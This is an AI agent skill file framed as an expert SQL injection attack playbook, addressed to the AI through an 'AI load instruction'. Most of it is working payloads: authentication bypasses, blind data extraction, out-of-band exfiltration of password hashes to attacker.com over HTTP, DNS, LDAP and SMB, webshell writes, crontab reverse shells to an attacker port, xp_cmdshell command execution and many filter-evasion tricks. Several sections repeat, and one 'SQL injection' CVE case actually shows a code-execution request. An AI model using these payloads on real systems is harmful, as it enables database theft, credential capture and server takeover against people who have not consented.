---
name: sqli-sql-injection
description: >-
  SQL injection playbook. Use when input reaches SQL queries, authentication logic, sorting, filtering, reporting, or DB-specific blind and out-of-band execution paths.
---

# SKILL: SQL Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Advanced SQLi techniques. Assumes basic UNION/error/boolean-blind fundamentals known. Focuses on: per-database exploitation, out-of-band exfiltration, second-order injection, parameterized query bypass scenarios, filter evasion, and escalation to OS.

## 0. QUICK START


### First-pass payload families

| Situation | Start With | Why |
|---|---|---|
| Login or boolean branch | `' or 1=1--` | Fast signal on auth or conditional checks |
| Numeric parameter | `1 or 1=1` | Avoid quote dependency |
| ORDER BY / sorting | `1,2,3` then `1 desc--` | Good for structural probing |
| Visible SQL errors | `'` then DBMS-specific error probes | Error text gives DBMS clues |
| No visible output | time-based payloads | Stable fallback for blind targets |
| Heavy filtering / WAF | polyglot or whitespace-free variants | Expands parser confusion surface |

### Small, stable first-pass set

```text
'
' or 1=1--
' or '1'='1'--
1 or 1=1
') or ('1'='1
'; WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
'||(SELECT pg_sleep(5))--
1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)
' order by 1--
' union select null--
```

### DBMS routing hints

| Clue | Likely DBMS | Good Next Move |
|---|---|---|
| `You have an error in your SQL syntax` | MySQL | try `SLEEP()` and `@@version` |
| `Microsoft OLE DB Provider` | MSSQL | try `WAITFOR DELAY` |
| `PG::` / `PostgreSQL` | PostgreSQL | try `pg_sleep()` |
| `ORA-` prefix | Oracle | pivot to out-of-band or XML features |
| SQLite errors, local apps | SQLite | focus on boolean/UNION and file-backed behavior |

---

## 1. DETECTION — SUBTLE INDICATORS

Most SQLi is found by **behavioral differences**, not errors:

| Signal | Meaning |
|---|---|
| Page loads differently with `'` vs `''` | String context injection point |
| Numeric: `1` vs `1-1` vs `2-1` returns same | Arithmetic evaluated |
| `1=1` vs `1=2` in condition changes result | Boolean-based injection |
| SELECT with ORDER BY N: column count enumeration | UNION prep |
| Time delay: `'; WAITFOR DELAY '0:0:5'--` | Blind/time-based |
| 500 error on `'`, 200 on `''` | Unhandled exception = SQLi |
| Different HTTP response size | Boolean blind indicator |

**Critical**: test in ALL parameter types — URL query, POST body, JSON fields, XML values, HTTP headers (X-Forwarded-For, User-Agent, Referer, Cookie values).

---

## 2. DATABASE FINGERPRINTING

```sql
-- MySQL
VERSION()              -- returns version string
@@datadir              -- data directory
@@global.secure_file_priv  -- file read restriction

-- MSSQL
@@VERSION              -- includes "Microsoft SQL Server"
DB_NAME()              -- current database
USER_NAME()            -- current user

-- Oracle
v$version              -- SELECT banner FROM v$version WHERE ROWNUM=1
sys.database_name      -- current db (alternative)
user                   -- current Oracle user

-- PostgreSQL
version()              -- returns version
current_database()     -- current db
current_user           -- current user
```

**Error-based fingerprint**: inject `'` and read error message format. MySQL errors differ from Oracle/MSSQL.

---

## 3. UNION-BASED DATA EXTRACTION

**Column count determination**:
```sql
ORDER BY 1--
ORDER BY 2--
ORDER BY N--   ← until error = N-1 columns
```

**Column type detection** (NULL is safest):
```sql
UNION SELECT NULL,NULL,NULL--
UNION SELECT 'a',NULL,NULL--  ← find string column
```

**Database-specific string concat** (required when column accepts only int):
```sql
-- MySQL
CONCAT(username,0x3a,password)

-- MSSQL
username+'|'+password

-- Oracle
username||'|'||password

-- PostgreSQL
username||':'||password
```

---

## 4. BLIND INJECTION — INFERENCE TECHNIQUES

### Boolean Blind (conditional response difference)
```sql
-- Does first char of username = 'a'?
' AND SUBSTRING(username,1,1)='a'--
' AND ASCII(SUBSTRING(username,1,1))>96--

-- Oracle
' AND SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)='a'--

-- MSSQL
' AND SUBSTRING((SELECT TOP 1 username FROM users),1,1)='a'--
```

### Time-Based Blind (no response difference)
```sql
-- MSSQL (most reliable)
'; IF (SUBSTRING(username,1,1)='a') WAITFOR DELAY '0:0:5'--

-- MySQL
' AND IF(SUBSTRING(username,1,1)='a',SLEEP(5),0)--

-- Oracle
' AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
-- Oracle sleep alternative (no SLEEP):
' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

---

## 5. OUT-OF-BAND (OOB) EXFILTRATION — CRITICAL

Use when blind injection has no time/boolean indicator, or when batch queries can't return data inline.

### MSSQL — OpenRowSet (requires SQLOLEDB, outbound TCP)
```sql
'; INSERT INTO OPENROWSET(
  'SQLOLEDB',
  'DRIVER={SQL Server};SERVER=attacker.com,80;UID=sa;PWD=pass',
  'SELECT * FROM foo'
) VALUES (@@version)--

-- Exfiltrate table data:
'; INSERT INTO OPENROWSET(
  'SQLOLEDB',
  'DRIVER={SQL Server};SERVER=attacker.com,80;UID=sa;PWD=pass',
  'SELECT * FROM foo'
) SELECT TOP 1 username+':'+password FROM users--
```
Use **port 80 or 443** to bypass firewall egress restrictions.

### Oracle — UTL_HTTP (HTTP GET with data in URL path)
```sql
'+UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT username FROM all_users WHERE ROWNUM=1))--
```
Oracle's UTL_HTTP supports proxy — can exfil through corporate proxy!

### Oracle — UTL_INADDR (DNS exfiltration — often bypasses HTTP restrictions)
```sql
'+UTL_INADDR.GET_HOST_NAME((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com')--
```
Attacker sees: `HASH_VALUE.attacker.com` DNS query → read password hash.

### Oracle — UTL_SMTP / UTL_TCP
```sql
-- Email large data dumps:
UTL_SMTP.SENDMAIL(...)  -- send query results via email

-- Raw TCP socket:
UTL_TCP.OPEN_CONNECTION('attacker.com', 80)
```

### MySQL — DNS via LOAD_FILE (Windows + UNC path)
```sql
SELECT LOAD_FILE('\\\\attacker.com\\share')
-- Triggers DNS lookup before connection attempt
-- Works on Windows hosts with outbound SMB
```

### MySQL — INTO OUTFILE (in-band filesystem write)
```sql
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php'
-- Requirements: FILE privilege, writable web root, secure_file_priv=''
```

---

## 6. ESCALATION — OS COMMAND EXECUTION

### MSSQL — xp_cmdshell (if enabled, or if sysadmin)
```sql
'; EXEC xp_cmdshell('whoami')--

-- Enable if disabled (requires sysadmin):
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
```

### MySQL — UDF (User Defined Functions)
Write malicious shared library to filesystem, then `CREATE FUNCTION ... SONAME`.

### Oracle — Java Stored Procedures
```sql
-- Create Java class:
EXEC dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission','<<ALL FILES>>','execute');
-- Then exec OS commands via Java Runtime
```

---

## 7. SECOND-ORDER INJECTION

**Concept**: User input is stored safely (parameterized), but later **retrieved as trusted data** and concatenated into a new query without re-sanitization.

**Example attack flow**:
1. Register username: `admin'--`
2. Application safely inserts this into users table
3. Password change function fetches username from session (trusted!) and builds:
   ```sql
   UPDATE users SET password='newpass' WHERE username='admin'--'
   ```
4. Comment strips the condition → updates **admin's** password

**Key insight**: Any application function that reads stored data and uses it in a new DB query is a second-order candidate. Review: password change, profile update, admin action on user data.

---

## 8. PARAMETERIZED QUERY BYPASS SCENARIOS

Parameterized queries do NOT prevent SQLi when:

1. **Table/column names are user-controlled** — params can't parameterize identifiers:
   ```sql
   -- UNSAFE even with params:
   "SELECT * FROM " + tableName + " WHERE id = ?"
   ```
   Mitigation: whitelist-validate table/column names.

2. **Partial parameterization** — some fields concatenated, others parameterized:
   ```sql
   "SELECT * FROM users WHERE type='" + userType + "' AND id=?"
   -- userType not parameterized → injection
   ```

3. **IN clause** with dynamic count (common mistake in ORMs):
   ```sql
   SELECT * FROM items WHERE id IN (1, 2, ?)  -- only last is parameterized
   ```

4. **Second-order** — data retrieved from DB assumed clean, re-used in query without params.

---

## 9. FILTER EVASION TECHNIQUES

### Comment Injection (break keywords)
```sql
SEL/**/ECT
UN/**/ION
1 UN/**/ION ALL SEL/**/ECT NULL--
```

### Case Variation
```sql
UnIoN SeLeCt
```

### URL Encoding
```sql
%55NION  -- U
%53ELECT -- S
```

### Whitespace Alternatives
```sql
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users  -- tab
SELECT%0ausername%0aFROM%0ausers  -- newline
```

### String Construction (bypass literal-string detection)
```sql
-- MySQL concatenation without quotes:
CHAR(117,115,101,114,110,97,109,101)  -- 'username'

-- Oracle:
CHR(117)||CHR(115)||CHR(101)||CHR(114)

-- MSSQL:
CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)
```

---

## 10. DATABASE METADATA EXTRACTION

### MySQL
```sql
SELECT schema_name FROM information_schema.schemata
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

### MSSQL
```sql
SELECT name FROM master..sysdatabases
SELECT name FROM sysobjects WHERE xtype='U'  -- user tables
SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')
```

### Oracle
```sql
SELECT owner,table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
SELECT username,password FROM dba_users  -- requires DBA
```

### PostgreSQL
```sql
SELECT datname FROM pg_database
SELECT tablename FROM pg_tables WHERE schemaname='public'
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

---

## 11. STORED PROCEDURE ABUSE

### MSSQL — sp_OAMethod (COM automation)
```sql
DECLARE @o INT
EXEC sp_OACreate 'wscript.shell', @o OUT
EXEC sp_OAMethod @o, 'run', NULL, 'cmd.exe /c whoami > C:\out.txt'
```

### Oracle — DBMS_LDAP (outbound LDAP = DNS exfil)
```sql
SELECT DBMS_LDAP.INIT((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com',389) FROM dual
```

---

## 12. QUICK REFERENCE — INJECTION TEST STRINGS

```
'                          -- break string context
''                         -- escaped quote (test handling)
' OR 1=1--                 -- auth bypass attempt  
' OR 'a'='a               -- alternate auth bypass
'; SELECT 1--             -- statement termination
' UNION SELECT NULL--     -- UNION test
' AND 1=1--               -- boolean true
' AND 1=2--               -- boolean false (different response → injectable)
1; WAITFOR DELAY '0:0:3'-- -- MSSQL time delay
1 AND SLEEP(3)--          -- MySQL time delay
1 AND 1=dbms_pipe.receive_message(('a'),3)-- -- Oracle time delay
```

---

## 13. WAF BYPASS MATRIX

| Technique | Blocked | Bypass |
|---|---|---|
| Space filtered | `SELECT * FROM` | `SELECT/**/*//**/FROM`, `SELECT%0a*%0aFROM` |
| Comma filtered | `UNION SELECT 1,2,3` | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c` |
| Quote filtered | `'admin'` | `0x61646D696E` (hex), `CHAR(97,100,109,105,110)` |
| OR/AND filtered | `OR 1=1` | <code>&#124;&#124;1=1</code>, `&&1=1`, `DIV 0` |
| = filtered | `id=1` | `id LIKE 1`, `id REGEXP '^1$'`, `id IN (1)`, `id BETWEEN 1 AND 1` |
| SELECT filtered | | Use `handler` (MySQL), `PREPARE`+hex, or stacked queries |
| information_schema filtered | | `mysql.innodb_table_stats`, `sys.schema_table_statistics` |

Additional WAF bypass patterns:

- Polyglot: `SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/`
- Routed injection: `1' UNION SELECT 0x(inner_payload_hex)-- -` where inner payload is another full query hex-encoded
- Second Order: inject into storage, trigger when data is used in another query later
- PDO emulated prepare: when `PDO::ATTR_EMULATE_PREPARES=true`, stacked queries work even with parameterized-looking code

---

## 14. WAF BYPASS MATRIX

### No-Space Bypass
```sql
SELECT/**/username/**/FROM/**/users
SELECT(username)FROM(users)
```

### No-Comma Bypass
```sql
-- UNION with JOIN instead of comma:
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
-- SUBSTRING alternative: SUBSTRING('abc' FROM 1 FOR 1)
-- LIMIT alternative: LIMIT 1 OFFSET 0
```

### Polyglot Injection
```sql
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

### Routed Injection
```sql
-- First query returns string used as input to second query:
' UNION SELECT CONCAT(0x222c,(SELECT password FROM users LIMIT 1))--
-- The returned value becomes part of another SQL context
```

### Second-Order Injection
```
-- Step 1: Register username: admin'--
-- Step 2: Trigger password change (uses stored username in SQL)
-- UPDATE users SET password='new' WHERE username='admin'--'
```

### PDO / Prepared Statement Edge Cases
```php
// Unsafe even with PDO when query structure is dynamic:
$pdo->query("SELECT * FROM " . $_GET['table']);
// Or when using emulated prepares with multi-query:
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, true);
```

### Entry Point Detection (Unicode tricks)
```
U+02BA ʺ (modifier letter double prime) → "
U+02B9 ʹ (modifier letter prime) → '
%%2727 → %27 → '
```

## History-derived validation notes (generic)

- In login-form SQLi, preserve the live session and every required hidden state, including CSRF fields, for each request; test username and password inputs independently so a rejected probe in one field does not hide a vulnerable second field.
- Treat login validation as a two-sided gate: require account-specific content or a protected account route and also confirm the application is no longer in its failure state; navigation text alone is a weak signal.
- For category or filter SQLi, keep the baseline/false/true comparison explicit and record row-set changes and result placement; a reflected heading or a status banner alone is not proof of additional data or impact.
- For UNION structure discovery, keep each structural probe small and stop after the last valid column boundary, accepted width, and a text-capable position are known. If a batch fails, classify local construction, quoting, or encoding errors separately from server rejection before changing the SQL hypothesis.
- For time-based blind SQLi, benchmark normal latency before testing conditions, choose the smallest stable delay primitive, and treat doubled or noisy delays as evidence of repeated execution or transport noise; extract only after the true/false timing separation is stable.

## SRC / Practice note - 2026-08-06 early SQLi run migration notes

- For hidden-data SQLi, keep the baseline / false / true branch comparison explicit and confirm that the true branch exposes additional rows instead of trusting only a changed heading or banner.
- For login-bypass SQLi, test one input at a time and require the real account page as the success gate; a changed navbar or redirect alone is too weak.
- For XML-encoded filter-bypass SQLi, preserve the distinction between payload transport encoding and the SQL logic itself: first confirm the backend accepts the encoded shape, then re-run a minimal boolean/auth bypass probe through that transport.

## SRC / Practice note - consolidated legacy SQLi learning records

- Treat blind SQLi as an oracle-selection problem: first identify whether the sink yields a boolean content difference, an error-shape difference, or only a timing difference, then keep extraction within that stable oracle instead of mixing branches.
- For cookie-based blind SQLi, preserve the warmed session and validate the signal before extraction; if a delay primitive appears to run twice, prefer a cleaner scalar sleep form before continuing.
- For UNION and database-enumeration style SQLi, separate structure discovery, backend fingerprinting, and data retrieval. Confirm column count and a text-capable position first, then choose dialect-specific metadata sources for version or schema listing.
- For hidden-data SQLi in filters or WHERE clauses, keep the baseline/false/true comparison explicit and prove that extra rows are actually exposed rather than trusting surface reflection alone.

## Extended cases merged from SCENARIOS.md

## 1. SMB Out-of-Band Exfiltration (MySQL on Windows)


When the MySQL server runs on Windows with outbound SMB allowed:

```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.attacker.com\\share'));
-- Triggers SMB connection → DNS lookup with data in hostname

-- More complete:
SELECT LOAD_FILE(CONCAT('\\\\attacker-ip\\', user(), '\\l.txt'));
-- SMB authentication attempt → attacker captures NTLMv2 hash via Responder
```

**Compared to DNS exfiltration**: SMB exfil can also leak NTLM hashes, enabling offline password cracking. DNS exfil is more reliable across firewalls.

---

## 2. KEY Injection / URI Injection


Beyond GET/POST parameters, SQL injection may occur in less-tested locations:

| Injection Point | Example |
|---|---|
| JSON key names | `{"admin' OR 1=1--": "value"}` — if key is used in column name |
| URI path segments | `/api/users/1 OR 1=1` — if path param enters SQL |
| HTTP headers | `X-Forwarded-For: 127.0.0.1' OR 1=1--` |
| Cookie values | `session=abc' UNION SELECT...` |
| Multipart filename | `filename="test' OR '1'='1.jpg"` |
| ORDER BY from API sort param | `?sort=name; DROP TABLE--` |

---

## 3. INSERT / DELETE / UPDATE Injection Differences


Most SQLi training focuses on SELECT. Real applications use INSERT/UPDATE/DELETE with different exploitation strategies:

### INSERT Statement Injection

```sql
-- Original: INSERT INTO logs (user, action) VALUES ('INPUT', 'login');
-- Injection in user field:
INPUT: admin', 'login'), ('attacker', (SELECT password FROM users LIMIT 1))--
-- Result: INSERT INTO logs (user, action) VALUES ('admin', 'login'), ('attacker', 'actual_password')--', 'login');
-- Exfiltrates data into a visible log table
```

### UPDATE Statement Injection

```sql
-- Original: UPDATE users SET email='INPUT' WHERE id=5;
-- Injection: '), admin=1 WHERE username='victim'--
-- Result: UPDATE users SET email=''), admin=1 WHERE username='victim'--' WHERE id=5;
-- Escalates victim's privileges
```

### DELETE Statement Injection

```sql
-- Original: DELETE FROM cart WHERE item_id='INPUT' AND user_id=5;
-- Injection: 1' OR '1'='1
-- Result: DELETE FROM cart WHERE item_id='1' OR '1'='1' AND user_id=5;
-- Deletes all cart items (DoS / data destruction)
```

---

## 4. CVE Case: ThinkPHP5 SQL Injection


ThinkPHP5 framework's `where` method improperly handles array parameters:

```
POST /index/think\app/invokefunction
Content-Type: application/x-www-form-urlencoded

function=call_user_func_array&vars[0]=system&vars[1][]=id
```

Error-based extraction using `updatexml`:
```sql
id=1' AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1)--
```

---

## 5. CVE Case: Django GIS SQL Injection (CVE-2020-9402)


Django's GIS `GeoQuerySet` methods (e.g., `annotate` with `RawSQL`) on Oracle backend allow error-based injection via `utl_inaddr.get_host_name`:

```sql
-- Oracle error-based exfiltration:
' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--
-- Oracle raises ORA-29257 containing the username in the error message

-- DNS-based out-of-band on Oracle:
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com')--
```

**Takeaway**: Oracle-specific functions (`utl_inaddr`, `utl_http`, `dbms_ldap`) are powerful OOB channels that bypass most firewall restrictions.

---

## 6. SQL Injection via Different SQL Verbs


Applications may use different HTTP methods and SQL verbs for the same endpoint:

```text
GET  /api/items?id=1      → SELECT (read)
POST /api/items            → INSERT (create)
PUT  /api/items/1          → UPDATE (modify)
DELETE /api/items/1        → DELETE (remove)

Each verb constructs a different SQL statement.
Test ALL verbs, not just the one shown in the UI.
```

---

## 7. Universal Password Bypass Patterns


```sql
-- Standard:
admin'--
admin' OR 1=1--
' OR '1'='1

-- With parentheses (common in PHP apps):
') OR ('1'='1
') OR 1=1--

-- With comment variations:
admin'/*
admin' OR 1=1#

-- Without quotes (numeric context):
1 OR 1=1
0 OR 1=1
```

---

## 8. DB2 Injection Specifics


DB2 uses distinct syntax and system tables.

### Enumeration
```sql
SELECT versionnumber, version_timestamp FROM sysibm.sysversions
SELECT schemaname FROM syscat.schemata
SELECT inst_name FROM sysibmadm.env_inst_info
SELECT 1 FROM sysibm.sysdummy1   -- equivalent to Oracle DUAL
```

### Blind Injection
```sql
-- Character extraction:
AND ascii(substr((SELECT user FROM sysibm.sysdummy1),1,1)) > 64

-- Row selection (no LIMIT):
SELECT column FROM table FETCH FIRST 1 ROWS ONLY

-- Time-based via Cartesian product (no SLEEP):
AND 1=(SELECT COUNT(*) FROM sysibm.sysdummy1 a, sysibm.sysdummy1 b, sysibm.sysdummy1 c)
```

### Command Execution
```sql
-- IBM i (AS/400) only:
CALL QSYS2.QCMDEXC('COMMAND_HERE')
```

### WAF Bypass
```sql
-- Avoid quotes via chr() concatenation:
chr(65)||chr(68)||chr(77)||chr(73)||chr(78)   -- 'ADMIN'
```

---

## 9. Cassandra Injection Specifics (CQL)


Cassandra Query Language has severe limitations for injection:

### Key Limitations
- No JOIN, no UNION, no subqueries
- No `OR` operator in WHERE clause
- No `SLEEP()` or time-delay function
- No built-in `USER()` function

### Authentication Bypass
```sql
-- Null byte termination:
admin' ALLOW FILTERING; %00

-- Multi-line comment closure:
admin'/*    (in username)
*/and pass>'  (in password)
```

### Comments
```sql
/* multi-line comment */
-- No single-line comment syntax
```

---

## 10. BigQuery Injection Specifics


Google BigQuery uses backtick-quoted identifiers and lacks traditional blind techniques.

### Identification
```sql
-- Backtick syntax is distinctive:
SELECT * FROM `project.dataset.table`

-- System variables:
SELECT @@project_id
```

### Enumeration
```sql
SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA
-- Fully qualified table names required: project.dataset.table
```

### Error-based
```sql
-- Division by zero:
' OR if(1/(length((select('a')))-1)=1,true,false) OR '
```

### Boolean Blind
```sql
' AND SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1),1,1)='A' --
```

### Key Notes
- No native `SLEEP()` function for time-based blind
- Comments: `#`, `/* */`
- No stacked queries support

---

## 11. SQLite Injection to RCE


SQLite supports file operations that can escalate to code execution.

### Enumeration
```sql
SELECT name FROM sqlite_master WHERE type='table'
SELECT sql FROM sqlite_master WHERE name='target_table'
SELECT * FROM pragma_table_info('target_table')
```

### Write Webshell via ATTACH DATABASE
```sql
ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
CREATE TABLE pwn.cmd (payload text);
INSERT INTO pwn.cmd VALUES ('<?php system($_GET["c"]); ?>');
```

### Write Cron Job
```sql
ATTACH DATABASE '/var/spool/cron/crontabs/www-data' AS cron;
CREATE TABLE cron.job (payload text);
INSERT INTO cron.job VALUES ('* * * * * /bin/bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"');
```

### load_extension (if enabled)
```sql
-- Load shared library for RCE (rarely enabled):
SELECT load_extension('/tmp/evil.so')
-- Windows UNC path variant:
SELECT load_extension('\\attacker\share\evil.dll')
```

### writefile (if available)
```sql
SELECT writefile('/var/www/html/shell.php', '<?php system($_GET["c"]); ?>');
```

### Error-based
```sql
-- Trigger error via nonexistent function:
CASE WHEN [condition] THEN 1 ELSE load_extension(1) END
```

### Time-based (no SLEEP)
```sql
-- CPU-intensive operation as delay:
AND 1=LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(500000000/2))))
```

---

## 12. WAF Bypass Matrix


### No Spaces Allowed
```sql
/**/UNION/**/SELECT/**/1,2,3
UNION%09SELECT%091,2,3     -- tab character
UNION%0BSELECT%0B1,2,3    -- vertical tab
UNION(SELECT(1),(2),(3))   -- parentheses instead of spaces
```

### No Commas Allowed
```sql
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
-- CASE/JOIN substitution
SELECT CASE WHEN 1=1 THEN 1 END FROM dual
-- OFFSET instead of comma in LIMIT:
LIMIT 1 OFFSET 0
```

### Polyglot Injection
```sql
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

### Routed Injection
```sql
-- Nested query where inner result becomes part of outer:
1' UNION SELECT 0x2720554e494f4e2053454c454354 -- (hex-encoded second stage)
```

### Second Order Injection
```
Step 1: Register username: admin'--
Step 2: Login as admin'-- (stored in session)
Step 3: Change password → UPDATE users SET password='new' WHERE user='admin'--'
        Effectively changes admin's password
```

---

## 13. CTF-Oriented Techniques


### handler (bypass SELECT filter)
```sql
-- When SELECT is blocked:
handler `table_name` open as a;
handler `a` read next;
handler `a` close;
```

### prepare + hex (bypass keyword filters)
```sql
SET @a=0x73656c65637420757365722829;  -- hex of "select user()"
PREPARE execsql FROM @a;
EXECUTE execsql;
```

### innodb_table_stats (bypass information_schema filter)
```sql
-- When 'information_schema' or 'or' is filtered:
SELECT table_name FROM mysql.innodb_table_stats WHERE database_name=database()
```

### No-column-name Injection
```sql
-- When column names are unknown:
SELECT `3` FROM (SELECT 1,2,3 UNION SELECT * FROM target_table)a LIMIT 1,1
-- Backtick number refers to positional column
```

### Double-write Bypass
```sql
-- When keywords are removed once:
uunionnion sselectelect 1,2,3 ffromrom target
-- After removal: union select 1,2,3 from target
```

### group_concat Alternative
```sql
-- When group_concat is filtered, use GROUP BY with error:
SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x
```

---

## 14. DB2 Injection Specifics


DB2 uses different system catalogs and has unique capabilities:

```sql
-- Version detection
SELECT versionnumber, version_timestamp FROM sysibm.sysversions

-- Current user
SELECT user FROM sysibm.sysdummy1

-- Schema enumeration
SELECT schemaname FROM syscat.schemata
SELECT name, tbname FROM sysibm.syscolumns WHERE tbname='USERS'

-- Blind injection
SELECT CASE WHEN (1=1) THEN 'a' ELSE 'b' END FROM sysibm.sysdummy1
-- Character extraction:
SELECT ascii(substr(user,1,1)) FROM sysibm.sysdummy1

-- Time-based (Cartesian product amplification)
SELECT count(*) FROM sysibm.columns t1, sysibm.columns t2, sysibm.columns t3

-- Command execution (IBM i / AS/400)
CALL QSYS2.QCMDEXC('COMMAND_STRING')

-- WAF bypass: concatenate without quotes
chr(65)||chr(68)||chr(77)||chr(73)||chr(78)
```

---

## 15. Cassandra (CQL) Injection Specifics


Cassandra Query Language has severe limitations compared to SQL:

```
-- Key differences from SQL:
-- * No JOIN, no UNION, no subqueries
-- * No OR operator in WHERE clause
-- * No SLEEP() or time-delay functions
-- * No built-in USER() function
-- * Comments: /* ... */ only

-- Login bypass:
username: admin' ALLOW FILTERING; %00
-- Multi-line comment bypass:
username: admin'/*
password: */and pass>'

-- Boolean extraction via IF() in CQL:
SELECT * FROM users WHERE user='admin' IF EXISTS
```

---

## 16. BigQuery Injection Specifics


Google BigQuery uses backticks and has unique syntax:

```sql
-- Identification: backtick syntax for identifiers
SELECT * FROM `project.dataset.table`

-- System information
SELECT @@project_id

-- Schema enumeration
SELECT * FROM `project.dataset.INFORMATION_SCHEMA.SCHEMATA`
-- Fully qualified: project.dataset.INFORMATION_SCHEMA.TABLES

-- Comments: # and /* */

-- Error-based (division by zero):
' OR if(1/(length((select('a')))-1)=1,true,false) OR '

-- Boolean-based
' AND SUBSTRING((SELECT column FROM dataset.table LIMIT 1),1,1)='A

-- IMPORTANT: No native SLEEP() function
-- No time-based blind injection possible with standard functions

-- UNION template:
' UNION ALL SELECT (SELECT @@project_id),2,3--
```

---

## 17. SQLite Injection to RCE


SQLite has powerful file system interaction capabilities:

```sql
-- Enumeration
SELECT name FROM sqlite_master WHERE type='table'
SELECT sql FROM sqlite_master WHERE name='users'
SELECT * FROM pragma_table_info('users')

-- Blind injection
SELECT CASE WHEN (1=1) THEN 'a' ELSE 'b' END
-- Hex-based character extraction:
SELECT hex(substr(password,1,1)) FROM users LIMIT 1

-- Error-based
SELECT CASE WHEN [BOOLEAN] THEN 1 ELSE load_extension(1) END

-- Time-based (heavy computation)
SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))

-- RCE via ATTACH DATABASE (write webshell)
ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
CREATE TABLE pwn.exp (payload TEXT);
INSERT INTO pwn.exp VALUES ('<?php system($_GET["c"]); ?>');

-- RCE via ATTACH DATABASE (write crontab)
ATTACH DATABASE '/var/spool/cron/crontabs/www-data' AS pwn;
CREATE TABLE pwn.exp (payload TEXT);
INSERT INTO pwn.exp VALUES ('* * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1');

-- RCE via load_extension
-- Compile shared library with init function, then:
SELECT load_extension('/tmp/evil.so','init_func');
-- Windows UNC: SELECT load_extension('\\attacker\share\evil.dll');

-- Write file (if enabled)
SELECT writefile('/var/www/html/shell.php', '<?php system($_GET["c"]); ?>');
```

---

## 18. CTF SQL Injection Techniques


### handler Bypass (when SELECT is filtered)
```sql
-- MySQL-specific alternative to SELECT:
handler `tablename` open as a;
handler `a` read next;
handler `a` close;
```

### prepare + hex (when keywords are filtered)
```sql
SET @a=0x73656C65637420757365722C70617373776F72642066726F6D207573657273;
-- hex of: select user,password from users
prepare execsql from @a;
execute execsql;
```

### innodb_table_stats (bypass information_schema filter)
```sql
-- When 'information_schema' or 'or' is filtered:
SELECT table_name FROM mysql.innodb_table_stats WHERE database_name=database()
```

### No-column-name injection
```sql
-- When column names are unknown:
SELECT `1` FROM (SELECT 1,2,3 UNION SELECT * FROM users)a
-- Backtick numbers correspond to column positions
```

### Double-write bypass
```sql
-- When keywords are removed once:
uunionnion sselectelect ffromrom
-- After filter removes: union select from
```

### XOR blind injection
```sql
-- When most operators are filtered but ^ remains:
id=1^(ascii(substr((select(flag)from(flag)),1,1))>100)^1
```

### PIPES_AS_CONCAT mode
```sql
-- When || is not filtered:
SET sql_mode=PIPES_AS_CONCAT;
SELECT 1||flag FROM flag
-- || acts as string concatenation instead of OR
```

### Rename/Alter table trick
```sql
-- Rename flag table to match app's expected query:
ALTER TABLE flag RENAME TO words;
ALTER TABLE words ADD COLUMN id INT DEFAULT 1;
-- App query: SELECT * FROM words WHERE id=1 → returns flag data
```
